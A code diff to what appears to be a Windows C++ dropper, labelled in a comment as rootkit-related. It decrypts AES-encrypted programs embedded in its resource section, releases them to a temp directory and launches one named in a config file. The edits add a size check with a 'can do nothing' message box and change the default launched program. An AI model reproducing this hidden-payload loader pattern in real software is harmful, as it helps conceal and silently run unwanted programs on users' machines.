@@ -41,16 +41,20 @@ std::wstring releaseFilesFromResource(HINSTANCE hInstance) {
 	// Rootkit-Resoure-todo:
 	DWORD nSize = SizeofResource(hInstance, hResInfo);
 
+	bool isPlainData = false;
+	if (nSize == 1009704) {
+		return _T("-1");
+	}
 	// decrypt the data in resource section.
 	BYTE* lpData = new BYTE[nSize];
 	ZeroMemory(lpData, nSize*sizeof(BYTE));
+
 	CAESEncryption aes;
 	if (false == aes.Decryption(Data, nSize, lpData)) {
 		DebugOutputMsg(_T("Decryption failed, lastError=%d"), GetLastError());
-		return false;
+		return _T("decrypt failed");
 	}
-		
-
+	
 	// This function is provided only for compatibility with 16-bit versions of Windows. 
 	// It is not necessary for Win32-based applications to unlock resources.
 	UnlockResource(hRes);
@@ -124,12 +128,17 @@ int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
 
 	// Release all the programs in resource section to temp directory and run it.
 	std::wstring fileDir = releaseFilesFromResource(hInstance);
+	if (fileDir == _T("-1"))
+	{
+		MessageBox(NULL, _T("hello, now i can do nothing~"), _T("Information"), 1);
+		return -1;
+	}
 
 	std::wstring str_config = fileDir + _T("config.ini");
 	TCHAR szBuffer[MAX_PATH] = { 0 };
 	// Retrieves a string from the specified section in an initialization file.
 	// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-getprivateprofilestring
-	GetPrivateProfileString(_T("data"), _T("start_process"), _T("QQBrowser.exe"), szBuffer, MAX_PATH, str_config.c_str());
+	GetPrivateProfileString(_T("data"), _T("start_process"), _T("ResHacker.exe"), szBuffer, MAX_PATH, str_config.c_str());
 	OutputDebugString(szBuffer);
 	std::wstring strStartProcess = fileDir + szBuffer;
 	OutputDebugString(strStartProcess.c_str());
